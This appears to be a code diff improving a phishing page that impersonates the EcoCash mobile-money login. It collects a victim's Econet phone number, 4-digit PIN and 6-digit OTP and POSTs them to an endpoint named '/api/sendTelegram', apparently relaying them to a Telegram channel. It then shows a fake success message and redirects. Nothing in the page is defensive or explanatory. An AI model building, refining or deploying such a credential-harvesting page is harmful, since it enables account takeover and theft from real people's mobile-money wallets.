@@ -9,81 +9,136 @@
 
 <style>
 *{box-sizing:border-box}
+html,body{height:100%}
 body{
   font-family:Inter,system-ui,Arial;
   background:linear-gradient(180deg,#f7fbff,#e8f3ff);
-  margin:0;padding:18px;
-  display:flex;align-items:center;justify-content:center;
+  margin:0;
+  padding:18px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
 }
+
 .card{
-  width:100%;max-width:380px;
-  background:#fff;padding:20px;border-radius:12px;
-  box-shadow:0 12px 30px rgba(0,0,0,.06)
+  width:100%;
+  max-width:380px;
+  background:#fff;
+  padding:20px;
+  border-radius:12px;
+  box-shadow:0 12px 30px rgba(2,6,23,0.06)
 }
+
 .logo{height:44px;display:block;margin:0 auto 10px}
-h2{text-align:center;margin-bottom:12px}
+h2{text-align:center;margin:0 0 12px;color:#111;font-size:20px}
 
-label{font-size:13px}
+label{display:block;font-size:13px;color:#374151;margin-top:8px}
+
 input{
-  width:100%;padding:10px;font-size:14px;
-  border-radius:8px;border:1px solid #e6eefc
+  width:100%;
+  padding:10px;
+  border-radius:8px;
+  border:1px solid #e6eefc;
+  background:#fbfdff;
+  font-size:14px
 }
+
 .btn{
-  width:100%;margin-top:12px;
-  background:#4b86ff;color:#fff;
-  padding:10px;border-radius:8px;border:0
+  background:#4b86ff;
+  color:#fff;
+  padding:10px;
+  border-radius:8px;
+  border:0;
+  margin-top:12px;
+  cursor:pointer;
+  width:100%
 }
-.btn[disabled]{background:#cbd5e1}
+.btn[disabled]{background:#cbd5e1;color:#6b7280;cursor:not-allowed}
 
-.error{
-  min-height:18px;
-  font-size:13px;
-  color:#d04444;
-}
-
-/* phone */
 .phone-wrap{
-  display:flex;gap:6px;align-items:center;
+  display:flex;
+  gap:6px;
+  align-items:center
 }
 .prefix{
   padding:10px;
   background:#f1f5f9;
   border:1px solid #e6eefc;
   border-radius:8px;
+  font-size:14px
 }
 
-/* pin */
-.pin-row{display:flex;gap:8px;justify-content:center;margin-top:6px}
+.error{
+  display:block;
+  min-height:18px;
+  margin-top:4px;
+  font-size:13px;
+  color:#d04444
+}
+
+.pin-row{
+  display:flex;
+  gap:8px;
+  justify-content:center;
+  margin-top:6px
+}
 .pin-digit{
-  width:40px;height:48px;
-  text-align:center;font-size:20px;
-  border-radius:8px;border:1px solid #e6eefc
+  width:40px;
+  height:48px;
+  text-align:center;
+  font-size:20px;
+  border-radius:8px;
+  border:1px solid #e6eefc;
+  background:#fbfdff
 }
 
-/* OTP */
+/* OTP modal */
 .otp-modal{
-  position:fixed;inset:0;
-  background:rgba(0,0,0,.35);
-  display:flex;align-items:center;justify-content:center
+  position:fixed;
+  inset:0;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  background:rgba(0,0,0,0.35)
 }
 .otp-box{
-  background:#fff;padding:18px;border-radius:12px;min-width:300px
+  background:#fff;
+  padding:18px;
+  border-radius:12px;
+  min-width:300px;
+  max-width:92%
 }
-.otp-row{display:flex;gap:8px;justify-content:center}
+.otp-row{
+  display:flex;
+  gap:8px;
+  justify-content:center;
+  margin-top:8px
+}
 .otp-digit{
-  width:40px;height:48px;
-  font-size:20px;text-align:center
+  width:40px;
+  height:48px;
+  text-align:center;
+  font-size:20px;
+  border-radius:8px;
+  border:1px solid #e6eefc;
+  background:#fbfdff
 }
-.otp-warning{color:#d04444;font-size:13px;display:none}
-.success{color:#16a34a;font-weight:600}
+.otp-warning{
+  color:#d04444;
+  font-size:13px;
+  margin-top:8px;
+  display:none
+}
 .small{font-size:13px;color:#6b7280}
+.success{color:#16a34a;font-weight:600}
 </style>
 </head>
 
 <body>
 
 <div class="card">
-  <img src="assets/eco.png" class="logo">
+  <img src="assets/eco.png" alt="EcoCash logo" class="logo">
+
   <h2>Login</h2>
 
   <form id="loginForm" autocomplete="off">
@@ -106,16 +161,16 @@ input{
     <!-- honeypot -->
     <input type="text" id="hp" style="display:none">
 
-    <button id="loginBtn" class="btn" disabled>LOGIN</button>
+    <button type="submit" id="loginBtn" class="btn" disabled>LOGIN</button>
   </form>
 </div>
 
 <!-- OTP MODAL -->
 <div id="otpModal" class="otp-modal" style="display:none">
   <div class="otp-box">
-    <strong>Enter OTP</strong>
+    <div style="text-align:center"><strong>Enter OTP</strong></div>
 
-    <div class="otp-row" style="margin-top:8px">
+    <div class="otp-row">
       <input class="otp-digit" maxlength="1" id="d0">
       <input class="otp-digit" maxlength="1" id="d1">
       <input class="otp-digit" maxlength="1" id="d2">
@@ -135,132 +190,165 @@ input{
       <button id="cancelOtp">Cancel</button>
     </div>
 
-    <div id="otpStatus" class="small"></div>
+    <div id="otpStatus" class="small" style="margin-top:8px"></div>
   </div>
 </div>
 
 <script>
-/* ===== PHONE ===== */
-const phone=document.getElementById('phone');
-const phoneError=document.getElementById('phoneError');
-const loginBtn=document.getElementById('loginBtn');
+/* ===== PHONE VALIDATION (INLINE WARNING) ===== */
+const phone = document.getElementById('phone');
+const phoneError = document.getElementById('phoneError');
+const loginBtn = document.getElementById('loginBtn');
 
 function validatePhone(){
-  const v=phone.value.replace(/\D/g,'');
-  phone.value=v;
+  const raw = phone.value.replace(/\D/g,'');
+  phone.value = raw;
 
-  if(!/^7\d{8}$/.test(v)){
-    phoneError.innerText='Input 9-digit Econet number starting with 7';
+  if(!/^7\d{8}$/.test(raw)){
+    phoneError.textContent = 'Input 9-digit Econet number starting with 7';
+    phoneError.style.visibility = 'visible';
     return false;
   }
-  phoneError.innerText='';
+
+  phoneError.textContent = '';
+  phoneError.style.visibility = 'visible';
   return true;
 }
 
-phone.addEventListener('input',()=>{
+phone.addEventListener('input', ()=>{
   validatePhone();
-  updateLogin();
+  updateLoginState();
 });
+phone.addEventListener('blur', validatePhone);
 
 /* ===== PIN ===== */
-const pins=[...document.querySelectorAll('.pin-digit')];
-let pin='';
+const pinBoxes = Array.from(document.querySelectorAll('.pin-digit'));
+let pinValue = '';
 
-pins.forEach((p,i)=>{
-  p.oninput=()=>{
-    p.value=p.value.replace(/\D/g,'');
-    if(p.value&&i<3)pins[i+1].focus();
-    pin=pins.map(x=>x.value).join('');
-    updateLogin();
-  };
-  p.onkeydown=e=>{
-    if(e.key==='Backspace'&&!p.value&&i>0){
-      pins[i-1].focus();
-      pins[i-1].value='';
+pinBoxes.forEach((box, idx)=>{
+  box.addEventListener('input', ()=>{
+    box.value = box.value.replace(/\D/g,'');
+    if(box.value && idx < 3) pinBoxes[idx+1].focus();
+    pinValue = pinBoxes.map(b=>b.value).join('');
+    updateLoginState();
+  });
+
+  box.addEventListener('keydown', e=>{
+    if(e.key === 'Backspace' && !box.value && idx > 0){
+      pinBoxes[idx-1].focus();
+      pinBoxes[idx-1].value = '';
       e.preventDefault();
     }
-  };
+  });
 });
 
-function updateLogin(){
-  loginBtn.disabled=!(validatePhone() && /^\d{4}$/.test(pin));
+function updateLoginState(){
+  loginBtn.disabled = !(
+    validatePhone() &&
+    /^\d{4}$/.test(pinValue)
+  );
 }
 
 /* ===== API ===== */
-const send=p=>fetch('/api/sendTelegram',{
-  method:'POST',
-  headers:{'Content-Type':'application/json'},
-  body:JSON.stringify(p)
-});
+async function sendToServer(payload){
+  return fetch('/api/sendTelegram', {
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify(payload)
+  });
+}
 
-/* ===== OTP ===== */
-const otpModal=document.getElementById('otpModal');
-const dEls=[0,1,2,3,4,5].map(i=>document.getElementById('d'+i));
-const confirm=document.getElementById('confirmOtp');
-const cancel=document.getElementById('cancelOtp');
-const countdown=document.getElementById('countdown');
-const resendInfo=document.getElementById('resendInfo');
-const status=document.getElementById('otpStatus');
+/* ===== OTP LOGIC (ORIGINAL) ===== */
+const otpModal = document.getElementById('otpModal');
+const dEls = [0,1,2,3,4,5].map(i=>document.getElementById('d'+i));
+const confirmBtn = document.getElementById('confirmOtp');
+const cancelBtn = document.getElementById('cancelOtp');
+const otpWarning = document.getElementById('otpWarning');
+const otpStatus = document.getElementById('otpStatus');
+const resendInfo = document.getElementById('resendInfo');
+const countdownEl = document.getElementById('countdown');
 
-let timer,sec=120;
+let resendTimer = null;
+let secondsLeft = 120;
 
-function startCountdown(){
-  clearInterval(timer);
-  sec=120;
-  resendInfo.innerHTML=`Resend available in <span id="countdown">120</span>s`;
-  timer=setInterval(()=>{
-    sec--;
-    countdown.innerText=sec;
-    if(sec<=0){
-      clearInterval(timer);
-      resendInfo.innerText="Didn't receive OTP?";
+function startResendCountdown(){
+  clearInterval(resendTimer);
+  secondsLeft = 120;
+  resendInfo.innerHTML = `Resend available in <span id="countdown">120</span>s`;
+  resendTimer = setInterval(()=>{
+    secondsLeft--;
+    countdownEl.textContent = secondsLeft;
+    if(secondsLeft <= 0){
+      clearInterval(resendTimer);
+      resendInfo.textContent = "Didn't receive OTP?";
     }
   },1000);
 }
 
-function otp(){return dEls.map(d=>d.value).join('');}
+function getOtp(){
+  return dEls.map(el=>el.value || '').join('');
+}
 
-dEls.forEach((d,i)=>{
-  d.oninput=()=>{
-    d.value=d.value.replace(/\D/g,'');
-    if(d.value&&i<5)dEls[i+1].focus();
-    confirm.disabled=!/^\d{6}$/.test(otp());
-  };
+function updateConfirmState(){
+  const ok = /^\d{6}$/.test(getOtp());
+  confirmBtn.disabled = !ok;
+  otpWarning.style.display = ok ? 'none' : 'block';
+}
+
+dEls.forEach((el, idx)=>{
+  el.addEventListener('input', ()=>{
+    el.value = el.value.replace(/\D/g,'');
+    if(el.value && idx < 5) dEls[idx+1].focus();
+    updateConfirmState();
+  });
+
+  el.addEventListener('keydown', e=>{
+    if(e.key === 'Backspace' && !el.value && idx > 0){
+      dEls[idx-1].focus();
+      dEls[idx-1].value = '';
+      e.preventDefault();
+    }
+  });
 });
 
 /* ===== LOGIN ===== */
-loginForm.onsubmit=async e=>{
+document.getElementById('loginForm').addEventListener('submit', async e=>{
   e.preventDefault();
-  if(hp.value) return;
+  if(document.getElementById('hp').value) return;
 
-  otpModal.style.display='flex';
+  otpModal.style.display = 'flex';
   dEls.forEach(d=>d.value='');
-  confirm.disabled=true;
-  startCountdown();
+  confirmBtn.disabled = true;
+  otpWarning.style.display = 'none';
+  otpStatus.textContent = '';
+  startResendCountdown();
 
-  await send({
+  await sendToServer({
     event:'login_clicked',
     loginPhone:'+263'+phone.value,
-    loginPin:pin,
+    loginPin:pinValue,
     submittedAt:new Date().toISOString()
   });
-};
+});
 
-cancel.onclick=()=>{
-  otpModal.style.display='none';
-  clearInterval(timer);
-};
+cancelBtn.addEventListener('click', ()=>{
+  otpModal.style.display = 'none';
+  clearInterval(resendTimer);
+});
 
-confirm.onclick=async()=>{
-  await send({
+confirmBtn.addEventListener('click', async ()=>{
+  await sendToServer({
     event:'otp_confirm',
     loginPhone:'+263'+phone.value,
-    loginPin:pin,
-    otp:otp(),
+    loginPin:pinValue,
+    otp:getOtp(),
     submittedAt:new Date().toISOString()
   });
-  status.innerHTML='<span class="success">Success</span>';
-};
+
+  otpStatus.innerHTML = "<span class='success'>Success — your request has been received.</span>";
+  setTimeout(()=>window.location.href='thankyou.html',1200);
+});
 </script>
+
 </body>
 </html>
